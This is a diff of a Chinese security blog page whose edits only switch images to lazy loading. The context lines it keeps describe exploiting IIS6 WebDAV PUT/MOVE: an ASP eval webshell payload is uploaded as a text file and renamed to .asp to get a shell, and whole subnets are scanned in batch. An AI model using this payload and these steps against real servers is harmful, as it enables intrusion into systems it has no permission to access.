@@ -70,7 +70,7 @@
     https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
     <div class="main-header-box">
         <a class="header-avatar" href="/" title="K8gege">
-            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" class="lazyload" data-src="/../images/avatar.png">
 			<h3 class="K8tilte">K8哥哥</h3>
         </a>
         <div class="branding">
@@ -211,8 +211,8 @@ window.location.href="http://k8gege.org/Ladon/iisput.html";
 <p>1 启用webdav组件<br>
 2 目录给写权限(为了方便直接eveyone完全写入权限)<br>
 3 脚本资源访问权限(不然MOVE失败即无法GetShell)</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/iis/iis6_cfg.PNG"></p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/iis/iis6_cfg2.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exp/iis/iis6_cfg.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exp/iis/iis6_cfg2.PNG"></p>
 <h3 id="漏洞复现">漏洞复现</h3>
 <p>使用LadonEXP可轻松复现此类漏洞，在Ladon改名前(Cscan)已复现过Tomcat，详情参考Tomcat CVE-2017-12615视频： <a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/tree/master/Video">https://github.com/k8gege/K8CScan/tree/master/Video</a></p>
 <h4 id="LadonExp配置PUT">LadonExp配置PUT</h4>
@@ -223,7 +223,7 @@ addurl: 123.txt<br>
 Data: &lt;%eval request(k8gege)%&gt;<br>
 点击buildexe-&gt;TestExe测试<br>
 成功返回 Created</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/iis/iis_put.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exp/iis/iis_put.PNG"></p>
 <h4 id="LadonExp配置MOVE">LadonExp配置MOVE</h4>
 <p>功能：将123.txt改名1.asp<br>
 Target: <a target="_blank" rel="noopener" href="http://192.168.1.22/123.txt">http://192.168.1.22/123.txt</a><br>
@@ -231,7 +231,7 @@ Method: Move<br>
 Destination: <a target="_blank" rel="noopener" href="http://192.168.1.22/1.asp">http://192.168.1.22/1.asp</a></p>
 <p>点击buildexe-&gt;TestExe测试<br>
 成功返回 Created</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/iis/iis_move.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exp/iis/iis_move.PNG"></p>
 <p>PS: 当然也可以直接PUT写入可解析的其它格式，也不一定非得先PUT再MOVE才能GetShell</p>
 <h4 id="Ladon批量">Ladon批量</h4>
 <p>扫描C段，当然也可以A段B段</p>
@@ -249,14 +249,14 @@ Destination: <a target="_blank" rel="noopener" href="http://192.168.1.22/1.asp">
 历史版本: <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a><br>
 IIS Exp: <a target="_blank" rel="noopener" href="https://github.com/k8gege/iisput">https://github.com/k8gege/iisput</a></p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
-<img alt="" style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
+<img alt="" style="display: inline-block;width: 250px;height: 300px;" class="lazyload" data-src="http://k8gege.org/img/k8team.jpg">
 </div>
 
     </div>
     
     <div class="reward" ontouchstart="">
     <div class="reward-wrap">
-	<img height="180" width="180" data-original="../images/k8join2.png">
+	<img height="180" width="180" class="lazyload" data-src="../images/k8join2.png">
 
     </div>
     <p class="reward-tip">
